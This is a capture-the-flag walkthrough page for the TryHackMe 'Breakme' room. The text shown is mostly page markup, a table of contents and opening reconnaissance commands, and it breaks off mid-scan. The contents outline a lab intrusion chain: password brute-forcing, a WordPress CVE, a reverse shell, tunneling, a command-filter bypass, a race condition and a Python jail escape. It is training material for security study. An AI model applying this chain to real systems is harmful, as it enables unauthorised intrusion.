<!doctype html><html lang=en dir=ltr><head><title>Breakme | THM Writeup :: CyberJagadeesh - Learn Cyber Security</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Introduction Detailed walkthroughs for Breakme CTF challenges on TryHackMe .
Initial Foothold $ echo &amp;#34;10.10.81.254 certain-doom.thm&amp;#34; &amp;gt;&amp;gt; /etc/hosts Mappped the ip to domain certain-doom.thm.
rustscan Lets startetwork with Network scan.
$ rustscan -a breakme.thm -- -sC -sV PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 8e:4f:77:7f:f6:aa:6a:dc:17:c9:bf:5a:2b:eb:8c:41 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPKq6PCdkc7tlJ9u/XcYjAfE8S8bOYjQe4+3teDY9e24Hfh7Qc3kXDIN52yu+ijvM7ZhcWwwLqikpNzqbhCQq8Ytf60lqNTPvekszBOP4xCJJWm2roGNftNu+IAIWgar7vOhHxLlniLdIt514pbiG2ZPZGxVdBHb7WsVVGUuM+b0AQOH7S9FLXBVqngrlrXUhhBsYtREfZxs4k+AE4N2ajcCEtPcdiLybPXddOD4GgM0nSwpTwlDehZ2NWVETT6ibQjl8T7WGogeIq1oO/LyOjLeu6MKuchp1H5FkIqe+wyZtRhjAsyKjrCGrCV4QM004AtcR/NjHaK7vvEqvRKOYmCmk7IotV/AtAD37GEu+qX0SePWVbZ8DweVIHYBPbJv1nCXkAy+T8eoj1dnvCgKsfz7L5PbkWucfF+gwzGTHwq2n9TrEOy99p6MStNv8ZBkXBY+2moD0ahZA3f6qYuvjlH4uVTCzXnbLxGTK0hdWGvT4PvC0vGh661mmaIhI3Ag0= | 256 a3:9c:66:73:fc:b9:23:c0:0f:da:1d:c9:84:d6:b1:4a (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPeQGv1A7372SDcT2mRIrMxbQaXJ1RA1ibSYWQ6WJxPH5YZCEQzSTHh5eTrum2k0SvIjmPyLfsoVmmOoPZGaR1g= | 256 6d:c2:0e:89:25:55:10:a9:9e:41:6e:0d:81:9a:17:cb (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAuvMwyWKUHQmG5CUtHi/vQ5F2fhnT8k0jGo18znKuHQ 80/tcp open http syn-ack ttl 60 Apache httpd 2."><meta name=keywords content="cyber security,penetration testing,ethical hacking,vulnerability assessment,network security,application security,web application security,security testing,red teaming,bug bounty,CTFs,cybersecurity challenges,hacking tutorials,security tools,exploit development,reverse engineering,penetration tester,security researcher,security analyst,information security,digital forensics,incident response,threat intelligence,security awareness,social engineering,phishing,malware analysis,cryptography,cloud security,IoT security,mobile security,how to become a penetration tester,penetration testing tools,CTF challenges for beginners,web application penetration testing,network penetration testing,exploit development tutorial,reverse engineering techniques,bug bounty hunting tips,security research projects,cyber security certifications"><meta name=robots content="noodp"><link rel=manifest href=/manifest.json><meta property="og:url" content="https://cyberjagadeesh.github.io/posts/breakme/writeup/"><meta property="og:site_name" content="CyberJagadeesh"><meta property="og:title" content="Breakme | THM Writeup"><meta property="og:description" content='Introduction Detailed walkthroughs for Breakme CTF challenges on TryHackMe .
Initial Foothold $ echo "10.10.81.254 certain-doom.thm" >> /etc/hosts Mappped the ip to domain certain-doom.thm.
rustscan Lets startetwork with Network scan.
$ rustscan -a breakme.thm -- -sC -sV PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 8e:4f:77:7f:f6:aa:6a:dc:17:c9:bf:5a:2b:eb:8c:41 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPKq6PCdkc7tlJ9u/XcYjAfE8S8bOYjQe4+3teDY9e24Hfh7Qc3kXDIN52yu+ijvM7ZhcWwwLqikpNzqbhCQq8Ytf60lqNTPvekszBOP4xCJJWm2roGNftNu+IAIWgar7vOhHxLlniLdIt514pbiG2ZPZGxVdBHb7WsVVGUuM+b0AQOH7S9FLXBVqngrlrXUhhBsYtREfZxs4k+AE4N2ajcCEtPcdiLybPXddOD4GgM0nSwpTwlDehZ2NWVETT6ibQjl8T7WGogeIq1oO/LyOjLeu6MKuchp1H5FkIqe+wyZtRhjAsyKjrCGrCV4QM004AtcR/NjHaK7vvEqvRKOYmCmk7IotV/AtAD37GEu+qX0SePWVbZ8DweVIHYBPbJv1nCXkAy+T8eoj1dnvCgKsfz7L5PbkWucfF+gwzGTHwq2n9TrEOy99p6MStNv8ZBkXBY+2moD0ahZA3f6qYuvjlH4uVTCzXnbLxGTK0hdWGvT4PvC0vGh661mmaIhI3Ag0= | 256 a3:9c:66:73:fc:b9:23:c0:0f:da:1d:c9:84:d6:b1:4a (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPeQGv1A7372SDcT2mRIrMxbQaXJ1RA1ibSYWQ6WJxPH5YZCEQzSTHh5eTrum2k0SvIjmPyLfsoVmmOoPZGaR1g= | 256 6d:c2:0e:89:25:55:10:a9:9e:41:6e:0d:81:9a:17:cb (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAuvMwyWKUHQmG5CUtHi/vQ5F2fhnT8k0jGo18znKuHQ 80/tcp open http syn-ack ttl 60 Apache httpd 2.'><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-29T20:05:31+05:30"><meta property="article:modified_time" content="2024-09-29T20:05:31+05:30"><meta property="article:tag" content="Rustscan"><meta property="article:tag" content="Ffuf"><meta property="article:tag" content="Wpscan"><meta property="article:tag" content="Curl"><meta property="article:tag" content="Hydra"><meta property="article:tag" content="CVE-2023-1874"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/certaindoom/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/chrome/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/u.a.highschool/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/airplane/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/thenewyorkflankees/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/cyberlens/writeup/"><meta name=twitter:card content="summary"><meta name=twitter:title content="Breakme | THM Writeup"><meta name=twitter:description content='Introduction Detailed walkthroughs for Breakme CTF challenges on TryHackMe .
Initial Foothold $ echo "10.10.81.254 certain-doom.thm" >> /etc/hosts Mappped the ip to domain certain-doom.thm.
rustscan Lets startetwork with Network scan.
$ rustscan -a breakme.thm -- -sC -sV PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 8e:4f:77:7f:f6:aa:6a:dc:17:c9:bf:5a:2b:eb:8c:41 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPKq6PCdkc7tlJ9u/XcYjAfE8S8bOYjQe4+3teDY9e24Hfh7Qc3kXDIN52yu+ijvM7ZhcWwwLqikpNzqbhCQq8Ytf60lqNTPvekszBOP4xCJJWm2roGNftNu+IAIWgar7vOhHxLlniLdIt514pbiG2ZPZGxVdBHb7WsVVGUuM+b0AQOH7S9FLXBVqngrlrXUhhBsYtREfZxs4k+AE4N2ajcCEtPcdiLybPXddOD4GgM0nSwpTwlDehZ2NWVETT6ibQjl8T7WGogeIq1oO/LyOjLeu6MKuchp1H5FkIqe+wyZtRhjAsyKjrCGrCV4QM004AtcR/NjHaK7vvEqvRKOYmCmk7IotV/AtAD37GEu+qX0SePWVbZ8DweVIHYBPbJv1nCXkAy+T8eoj1dnvCgKsfz7L5PbkWucfF+gwzGTHwq2n9TrEOy99p6MStNv8ZBkXBY+2moD0ahZA3f6qYuvjlH4uVTCzXnbLxGTK0hdWGvT4PvC0vGh661mmaIhI3Ag0= | 256 a3:9c:66:73:fc:b9:23:c0:0f:da:1d:c9:84:d6:b1:4a (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPeQGv1A7372SDcT2mRIrMxbQaXJ1RA1ibSYWQ6WJxPH5YZCEQzSTHh5eTrum2k0SvIjmPyLfsoVmmOoPZGaR1g= | 256 6d:c2:0e:89:25:55:10:a9:9e:41:6e:0d:81:9a:17:cb (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAuvMwyWKUHQmG5CUtHi/vQ5F2fhnT8k0jGo18znKuHQ 80/tcp open http syn-ack ttl 60 Apache httpd 2.'><link rel=canonical href=https://cyberjagadeesh.github.io/posts/breakme/writeup/><link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=/css/index.min.1f9b3e6594d41770030cc9cea67e9220cd9066bb33910ebfb19ea46cf6b4b50c.css><script async src="https://www.googletagmanager.com/gtag/js?id=G-376DY6PW0W"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-376DY6PW0W")}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"CyberJagadeesh"},"dateModified":"2024-09-29T20:05:31+05:30","datePublished":"2024-09-29T20:05:31+05:30","description":"Introduction Detailed walkthroughs for Breakme CTF challenges on TryHackMe .\nInitial Foothold $ echo \u0026#34;10.10.81.254 certain-doom.thm\u0026#34; \u0026gt;\u0026gt; /etc/hosts Mappped the ip to domain certain-doom.thm.\nrustscan Lets startetwork with Network scan.\n$ rustscan -a breakme.thm -- -sC -sV PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 8e:4f:77:7f:f6:aa:6a:dc:17:c9:bf:5a:2b:eb:8c:41 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPKq6PCdkc7tlJ9u/XcYjAfE8S8bOYjQe4+3teDY9e24Hfh7Qc3kXDIN52yu+ijvM7ZhcWwwLqikpNzqbhCQq8Ytf60lqNTPvekszBOP4xCJJWm2roGNftNu+IAIWgar7vOhHxLlniLdIt514pbiG2ZPZGxVdBHb7WsVVGUuM+b0AQOH7S9FLXBVqngrlrXUhhBsYtREfZxs4k+AE4N2ajcCEtPcdiLybPXddOD4GgM0nSwpTwlDehZ2NWVETT6ibQjl8T7WGogeIq1oO/LyOjLeu6MKuchp1H5FkIqe+wyZtRhjAsyKjrCGrCV4QM004AtcR/NjHaK7vvEqvRKOYmCmk7IotV/AtAD37GEu+qX0SePWVbZ8DweVIHYBPbJv1nCXkAy+T8eoj1dnvCgKsfz7L5PbkWucfF+gwzGTHwq2n9TrEOy99p6MStNv8ZBkXBY+2moD0ahZA3f6qYuvjlH4uVTCzXnbLxGTK0hdWGvT4PvC0vGh661mmaIhI3Ag0= | 256 a3:9c:66:73:fc:b9:23:c0:0f:da:1d:c9:84:d6:b1:4a (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPeQGv1A7372SDcT2mRIrMxbQaXJ1RA1ibSYWQ6WJxPH5YZCEQzSTHh5eTrum2k0SvIjmPyLfsoVmmOoPZGaR1g= | 256 6d:c2:0e:89:25:55:10:a9:9e:41:6e:0d:81:9a:17:cb (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAuvMwyWKUHQmG5CUtHi/vQ5F2fhnT8k0jGo18znKuHQ 80/tcp open http syn-ack ttl 60 Apache httpd 2.","image":"/posts/breakme/BreakMe.png","name":"Breakme | THM Writeup","url":"https://cyberjagadeesh.github.io/posts/breakme/writeup/"}</script></head><body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800"><header class="flex flex-none justify-center z-10"><div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3"><div class="flex-none ml-2 md:ml-0"><a href=/><img class="h-12 w-12 rounded-full object-cover bg-gray-100" src=/logo.png alt=logo></a></div><div class=flex-1></div><div class=flex-none><nav class="h-full static"><button id=navbar-menu-toggle type=button class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls=navbar-menu aria-expanded=false>
<span class=sr-only>Open main menu</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 6h16"/><path d="M4 12h16"/><path d="M4 18h16"/></svg></i></button><div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id=navbar-menu><ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5"><li id=about><a class="block px-3 py-3 hover:text-emerald-600" href=/about/ title=About>About</a></li><li id=post><a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600" href=/posts/ title=Post>Post</a></li></ul></div></nav></div><div class="flex-none mx-1"></div><div class="flex-none md:hidden"><a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls=navbar-menu aria-expanded=false><span class=sr-only>Search</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1014 0A7 7 0 103 10"/><path d="M21 21l-6-6"/></svg></i></a></div><div class="darkmode-toggle flex flex-none mr-2 md:mr-0"><label for=darkmode-toggle class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode"><input name=darkmode-toggle id=darkmode-toggle type=checkbox class="sr-only peer" aria-label="Toggle dark mode"><div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700"><i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible"><svg class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-3 0a3 3 0 106 0 3 3 0 10-6 0"/><path d="M12 5v.01"/><path d="M17 7v.01"/><path d="M19 12v.01"/><path d="M17 17v.01"/><path d="M12 19v.01"/><path d="M7 17v.01"/><path d="M5 12v.01"/><path d="M7 7v.01"/></svg>
</i><i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible"><svg class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z"/><path d="M17 4a2 2 0 002 2 2 2 0 00-2 2 2 2 0 00-2-2 2 2 0 002-2"/><path d="M19 11h2m-1-1v2"/></svg></i></div></label></div></div></header><main class="flex flex-auto justify-center"><div class="w-full max-w-4xl lg:max-w-5xl"><div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700"><div><a href=/posts/breakme/writeup/><figure><img class="w-full object-cover h-36 md:h-48 xl:h-60" src=/posts/breakme/BreakMe.png alt="Breakme | THM Writeup" title="Breakme | THM Writeup" loading=lazy></figure></a></div><div class="flex flex-col gap-y-3 p-6"><h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100"><a href=/posts/breakme/writeup/>Breakme | THM Writeup</a></h1><ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300"><li><a href=/categories/ctf/ class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">CTF</a></li><li><a href=/tags/rustscan/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Rustscan</span></a></li><li><a href=/tags/ffuf/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Ffuf</span></a></li><li><a href=/tags/wpscan/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Wpscan</span></a></li><li><a href=/tags/curl/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Curl</span></a></li><li><a href=/tags/hydra/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Hydra</span></a></li><li><a href=/tags/cve-2023-1874/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>CVE-2023-1874</span></a></li><li><a href=/tags/pspy/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Pspy</span></a></li><li><a href=/tags/chisel/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Chisel</span></a></li><li><a href=/tags/tunneling/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Tunneling</span></a></li><li><a href=/tags/specialcharacterbypass/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>SpecialCharacterBypass</span></a></li><li><a href=/tags/ifs/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>${IFS}</span></a></li><li><a href=/tags/racecondition/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>RaceCondition</span></a></li><li><a href=/tags/pythonjailbreak/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>PythonJailBreak</span></a></li><li><a href=/tags/%F0%9D%98%A3%F0%9D%98%B3%F0%9D%98%A6%F0%9D%98%A2%F0%9D%98%AC%F0%9D%98%B1%F0%9D%98%B0%F0%9D%98%AA%F0%9D%98%AF%F0%9D%98%B5/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>ùò£ùò≥ùò¶ùò¢ùò¨ùò±ùò∞ùò™ùòØùòµ()</span></a></li><li><a href=/series/tryhackme/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Tryhackme</span></a></li><li><a href=/platforms/linux/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Linux</span></a></li><li><a href=/levels/medium/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Medium</span></a></li></ul><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 7a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V7z"/><path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/><path d="M11 15h1"/><path d="M12 15v3"/></svg>
</i><time datetime=2024-09-29T20:05:31+05:30>2024-09-29</time></div><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6.5 7h11"/><path d="M6 20v-2a6 6 0 1112 0v2a1 1 0 01-1 1H7a1 1 0 01-1-1z"/><path d="M6 4v2a6 6 0 1012 0V4a1 1 0 00-1-1H7A1 1 0 006 4z"/></svg>
</i><span>19 minutes to read</span></div></div><section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6"><h2>Table of Contents</h2><aside><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#initial-foothold>Initial Foothold</a><ul><li><a href=#rustscan>rustscan</a></li><li><a href=#fuff>fuff</a></li><li><a href=#wpscan>wpscan</a></li><li><a href=#wordpress-site>Wordpress site</a></li><li><a href=#curl-to-check-usernames-and-passwords>Curl to check Usernames and Passwords</a></li><li><a href=#valid-users-using-hydra>Valid Users using HYDRA</a></li><li><a href=#hydra-bobs-password>hydra (bob&rsquo;s password)</a></li><li><a href=#cve-2023-1874>CVE-2023-1874</a></li><li><a href=#reverse-shell>Reverse shell</a></li></ul></li><li><a href=#shell-as-john>Shell as John</a><ul><li><a href=#pspy64>pspy64</a></li><li><a href=#chisel-tunneling>Chisel tunneling</a></li><li><a href=#connecting-localhost9999>Connecting localhost:9999</a></li><li><a href=#special-character-bypass>Special Character ByPass</a></li><li><a href=#input_field_separators-ifs>Input_Field_Separators ${IFS}</a></li></ul></li><li><a href=#shell-as-youcef>Shell as Youcef</a><ul><li><a href=#race-condition>Race Condition</a></li><li><a href=#ssh2john>ssh2john</a></li></ul></li><li><a href=#shell-as-root>Shell as root</a><ul><li><a href=#python-jailbreak>Python JailBreak</a></li></ul></li><li><a href=#alternatives>Alternatives</a><ul><li><a href=#username-and-password-enumaration-using-wpscan>Username and Password enumaration using wpscan</a></li><li><a href=#python-jailbreak-using-ùò£ùò≥ùò¶ùò¢ùò¨ùò±ùò∞ùò™ùòØùòµ>Python JailBreak using ùò£ùò≥ùò¶ùò¢ùò¨ùò±ùò∞ùò™ùòØùòµ()</a></li></ul></li><li><a href=#extras>Extras</a><ul><li><a href=#jailpy>jail.py</a></li></ul></li></ul></nav></aside></section><article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content"><h2 id=introduction>Introduction</h2><p>Detailed walkthroughs for <a href=https://tryhackme.com/r/room/breakmenu target=_blank rel=noopener>Breakme</a>
CTF challenges on <a href=https://tryhackme.com target=_blank rel=noopener>TryHackMe</a>
.</p><h2 id=initial-foothold>Initial Foothold</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s2>&#34;10.10.81.254 certain-doom.thm&#34;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><p>Mappped the ip to domain <code>certain-doom.thm</code>.</p><h3 id=rustscan>rustscan</h3><p>Lets startetwork with Network scan.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ rustscan -a breakme.thm -- -sC -sV
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE REASON         VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     syn-ack ttl <span class=m>60</span> OpenSSH 8.4p1 Debian 5+deb11u1 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
